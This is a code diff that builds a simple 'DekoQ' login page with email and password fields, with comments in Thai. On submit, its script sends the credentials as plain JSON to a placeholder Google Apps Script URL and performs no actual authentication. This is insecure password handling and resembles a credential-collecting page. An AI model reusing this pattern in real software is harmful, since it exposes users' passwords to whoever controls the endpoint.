@@ -1,41 +1,171 @@
-<style>
-  .input-group {
-    position: relative;
-    width: 100%;
-    margin-bottom: 1.2rem;
-    height: 48px;
-  }
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>DekoQ Login</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #007BFF, #0056b3);
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+      color: white;
+      margin-bottom: 1rem;
+    }
+    .container h1 {
+      font-size: 3rem;
+      margin: 0;
+    }
+    .container p {
+      font-size: 1.2rem;
+      margin-top: 0.5rem;
+      margin-bottom: 2rem;
+    }
+    .login-box {
+      background: white;
+      padding: 2rem;
+      border-radius: 12px;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+      width: 90%;
+      max-width: 400px;
+    }
+    label {
+      font-weight: bold;
+      margin-bottom: 0.3rem;
+      color: #000;
+      text-align: left;
+      display: block;
+    }
+    .input-group {
+      position: relative;
+      width: 100%;
+      height: 48px;
+      margin-bottom: 1.2rem;
+    }
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      height: 100%;
+      font-size: 1rem;
+      padding: 0 3rem 0 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    .toggle-eye {
+      position: absolute;
+      top: 0;
+      right: 0;
+      width: 3rem;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+    .eye-icon {
+      width: 20px;
+      height: 20px;
+      fill: #333;
+      display: inline-block;
+    }
+    .hidden {
+      display: none;
+    }
+    button[type="submit"] {
+      width: 100%;
+      padding: 0.8rem;
+      background: #222;
+      color: white;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 1rem;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+  <div>
+    <div class="container">
+      <h1>DekoQ</h1>
+      <p>Welcome!</p>
+    </div>
+    <div class="login-box">
+      <form id="form">
+        <label for="email">Username/Email</label>
+        <div class="input-group">
+          <input type="email" id="email" name="email" placeholder="Value" required />
+        </div>
 
-  input[type="email"],
-  input[type="password"] {
-    width: 100%;
-    height: 100%;
-    font-size: 1rem;
-    padding: 0 3rem 0 1rem; /* เผื่อพื้นที่ด้านขวาสำหรับไอคอน */
-    border: 1px solid #ccc;
-    border-radius: 8px;
-    line-height: 1.2;
-    transition: none;
-  }
+        <label for="password">Password</label>
+        <div class="input-group">
+          <input type="password" id="password" name="password" placeholder="Value" required />
+          <button type="button" class="toggle-eye" onclick="togglePassword()" aria-label="Toggle Password">
+            <svg id="eye" class="eye-icon" viewBox="0 0 24 24">
+              <path d="M12 5c-7 0-11 7-11 7s4 7 11 7 11-7 11-7-4-7-11-7zm0 12a5 5 0 110-10 5 5 0 010 10z"/>
+            </svg>
+            <svg id="eye-off" class="eye-icon hidden" viewBox="0 0 24 24">
+              <path d="M1 1l22 22-1.5 1.5-3.1-3.1C17.2 23.3 14.7 24 12 24 5 24 1 17 1 17s1.5-2.6 4.3-4.6L2.4 6.5 1 1zm11 7c1.7 0 3 1.3 3 3 0 .5-.1 1-.4 1.4l-4-4c.4-.3.9-.4 1.4-.4zM5.6 9.8L8 12.2c-.4.3-.7.7-.9 1.2C5.4 13 4 14.3 4 14.3S5.8 18 12 18c1.9 0 3.6-.6 5.1-1.6l1.4 1.4C16.8 19.7 14.5 20 12 20c-7 0-11-7-11-7s1.6-3.5 4.6-5.2z"/>
+            </svg>
+          </button>
+        </div>
 
-  .toggle-eye {
-    position: absolute;
-    top: 0;
-    right: 10px;
-    width: 32px;
-    height: 100%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: none;
-    border: none;
-    cursor: pointer;
-    padding: 0;
-  }
+        <button type="submit">Submit</button>
+      </form>
+    </div>
+  </div>
 
-  .toggle-eye svg {
-    width: 20px;
-    height: 20px;
-    fill: #333;
-  }
-</style>
+  <script>
+    const form = document.querySelector("#form");
+    const scriptURL = "https://script.google.com/macros/s/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/exec"; // <- แก้เป็น URL ของคุณ
+
+    form.addEventListener("submit", (e) => {
+      e.preventDefault();
+      const email = form.email.value;
+      const password = form.password.value;
+
+      fetch(scriptURL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      })
+      .then(async (response) => {
+        const text = await response.text();
+        if (response.ok) {
+          alert("ส่งข้อมูลสำเร็จแล้ว!");
+          form.reset();
+        } else {
+          alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+        }
+      })
+      .catch((error) => {
+        console.error("Fetch Error!", error);
+        alert("เกิดข้อผิดพลาด กรุณาลองใหม่");
+      });
+    });
+
+    function togglePassword() {
+      const passwordInput = document.getElementById("password");
+      const eye = document.getElementById("eye");
+      const eyeOff = document.getElementById("eye-off");
+      const isHidden = passwordInput.type === "password";
+      passwordInput.type = isHidden ? "text" : "password";
+      eye.style.display = isHidden ? "none" : "inline-block";
+      eyeOff.style.display = isHidden ? "inline-block" : "none";
+    }
+  </script>
+</body>
+</html>
